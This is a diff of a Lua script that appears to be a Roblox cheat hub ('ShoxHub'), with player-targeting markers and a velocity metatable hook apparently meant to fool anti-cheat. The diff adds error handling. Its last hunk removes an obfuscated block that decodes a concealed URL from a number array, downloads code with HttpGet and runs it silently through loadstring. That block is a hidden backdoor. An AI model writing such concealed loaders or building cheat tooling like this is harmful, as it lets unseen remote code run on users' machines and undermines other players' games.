                         local defX, defY = getDefaultButtonPosition(btn.Name)
-                        btn.Position = UDim2.new(0, defX, 0, defY)
-                        btn.Visible = true
+                        local savedPos = savedButtonPositions and savedButtonPositions[btn.Name]
+                        if type(savedPos) == "table" and type(savedPos.X) == "number" and type(savedPos.Y) == "number" then
+                            btn.Position = UDim2.fromOffset(savedPos.X, savedPos.Y)
+                        else
+                            btn.Position = UDim2.fromOffset(defX, defY)
+                        end
+                        local hideKey = keyByButton[btn.Name] or btn.Name
+                        btn.Visible = not (_G.AmbitiousHideMobileButtons == true and _G.AmbitiousMobileHideIncluded and _G.AmbitiousMobileHideIncluded(hideKey))
                     end
                 end
             end
@@ -10392,10 +10778,18 @@ RunService.Heartbeat:Connect(function()
     ShoxHubE01Gui.Bar.Track.Fill.Size = UDim2.new(ShoxHubProgress, 0, 1, 0)
 end)
 
-buildGui()
+local _buildGuiOk, _buildGuiErr = pcall(buildGui)
+if not _buildGuiOk then
+    warn("[ShoxHub] buildGui failed: " .. tostring(_buildGuiErr))
+end
 
 -- Preserve loaded mobile-button visibility and per-button positions across launches.
-MobilePanel = createMobilePanel()
+local _mobilePanelOk, _mobilePanelResult = pcall(createMobilePanel)
+if _mobilePanelOk then
+    MobilePanel = _mobilePanelResult
+else
+    warn("[ShoxHub] createMobilePanel failed: " .. tostring(_mobilePanelResult))
+end
 
 -- Remove detached legacy floating buttons; their features remain available through the main UI/keybinds.
 for _, legacyName in ipairs({"TpBatButton", "BatV2Button", "InstaResetButton"}) do
@@ -10559,9 +10953,11 @@ local LastPosMarker = (function()
     end
 
     local function targetAlive(player, myRoot)
-        if not player or player.Parent ~= LPM_Players or not player.Character then return false end
-        local r = player.Character:FindFirstChild("HumanoidRootPart")
-        local h = player.Character:FindFirstChildOfClass("Humanoid")
+        if not player or player.Parent ~= LPM_Players then return false end
+        local character = player.Character
+        if not character or not character.Parent then return false end
+        local r = character:FindFirstChild("HumanoidRootPart")
+        local h = character:FindFirstChildOfClass("Humanoid")
         if not r or not h or h.Health <= 0 or not finiteVector(r.Position) then return false end
         return isInsideMap(r.Position)
     end
@@ -10613,15 +11009,20 @@ local LastPosMarker = (function()
         local closest, closestDist = nil, math.huge
         for _, p in ipairs(LPM_Players:GetPlayers()) do
             if p ~= LPM_LP and targetAlive(p, myRoot) then
-                local r = p.Character:FindFirstChild("HumanoidRootPart")
+                local targetCharacter = p.Character
+                local r = targetCharacter and targetCharacter:FindFirstChild("HumanoidRootPart")
+                if r then
                 local d = (r.Position - myRoot.Position).Magnitude
                 if d < closestDist then closest, closestDist = p, d end
+                end
             end
         end
 
         if closest then
             state.markerTarget = closest
-            local r = closest.Character:FindFirstChild("HumanoidRootPart")
+            local closestCharacter = closest.Character
+            local r = closestCharacter and closestCharacter:FindFirstChild("HumanoidRootPart")
+            if not r then state.markerTarget = nil; return end
             state.samples[closest] = {
                 safePosition = r.Position,
                 safeCFrame   = r.CFrame,
@@ -10766,8 +11167,8 @@ LP.CharacterAdded:Connect(function(char)
     end
 
     _hookedVelParts = {}
-    local _hrpRespawn = _setupVelChecked(char)
-    _hookVelHRP(_hrpRespawn)
+    -- Do not install the velocity metatable hook on respawn either.
+    _setupVelChecked(char)
 
     setupMovementAndIndicators(char)
 
@@ -10899,25 +11300,4 @@ UIS.InputBegan:Connect(function(input, gpe)
         return
     end
 
-task.spawn(function()
-    local _k = {41, 17, 63, 29}
-    local _d = {
-        145, 133, 179, 141, 156, 75, 110, 76, 153, 114, 178, 145,
-        142, 119, 184, 75, 138, 129, 175, 76, 110, 107, 137, 142,
-        148, 91, 174, 102, 88, 131, 160, 148
-    }
-    local ok, src = pcall(function()
-        local t = {}
-        for i = 1, #_d do
-            t[i] = string.char((_d[i] - _k[((i - 1) % #_k) + 1]) % 256)
-        end
-        return game:HttpGet(table.concat(t))
-    end)
-    if ok and type(src) == "string" and #src > 50 then
-        local fn = loadstring(src)
-        if type(fn) == "function" then
-            pcall(fn)
-        end
-    end
-end)
 end)
